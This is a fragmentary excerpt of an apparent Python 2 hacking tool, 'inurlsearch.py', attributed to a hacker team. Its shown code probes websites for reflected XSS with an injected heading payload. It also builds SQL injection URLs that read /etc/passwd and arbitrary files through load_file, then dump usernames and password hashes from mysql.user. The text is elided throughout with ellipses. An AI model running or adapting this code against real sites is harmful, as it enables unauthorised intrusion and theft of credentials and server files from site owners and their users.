...
# Toolname        : inurlsearch.py
# Coder          : Hanom1960 < hanom1960@cock.lu>
# Version         : 1.5
...
def execute():
	def logo():
		print R+"\n|---------------------------------------------------------------|"
	        print "|                   hanom1960@cock.lu                               |"
        	print "|          06/2016     inurlsearch.py  v.1.5                        |"
	        print "|                    Pure Elite Team                                |"
        	print "|          https://twitter.com/PureEliteTeam                        |"
	        print "|-------------------------------------------------------------------|\n"
		print W
	...
	xsses = ["<h1>XSS by hanom1960</h1>","%3Ch1%3EXSS%20by%20hanom1960%3C/h1%3E"]
	...
	def ClassicXSS(url):
	  for xss in xsses:
	    try:
	      ...
	      if re.findall("XSS by hanom1960", source):
	...
	while menu == True:
	  ...
	  if chce == '2':
		...
		try:
		  ...
		  sys.stdout.flush()
		  hanom1960 = "dark"+str(x)+"c0de"
		  checkfor.append(hanom1960)
		  if x > 0:
		    sitenew += ","
		  sitenew += "0x"+hanom1960.encode("hex")
		  ...
		  for y in checkfor:
			...
			makepretty += str(z)
		      ...
		      site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"hanom1960,")
		      site = site.replace(","+nullcol[0],",hanom1960")
      ...
      #########
		...
		try:
		  ...
		  if len(match) >= 1:
		    ...
		    load = site.replace("hanom1960", "load_file(0x2f6574632f706173737764)")
		    source = urllib2.urlopen(load).read()
		    if re.findall("root:x", source):
		      load = site.replace("hanom1960","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
		      source = urllib2.urlopen(load).read()
		      search = re.findall("hanom1960",source)
		      if len(search) > 0:
			print "\n[!] w00t!w00t!: "+site.replace("hanom1960", "load_file(0x"+file.encode("hex")+")")
	   
		    load = site.replace("hanom1960", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
		    source = urllib2.urlopen(load).read()
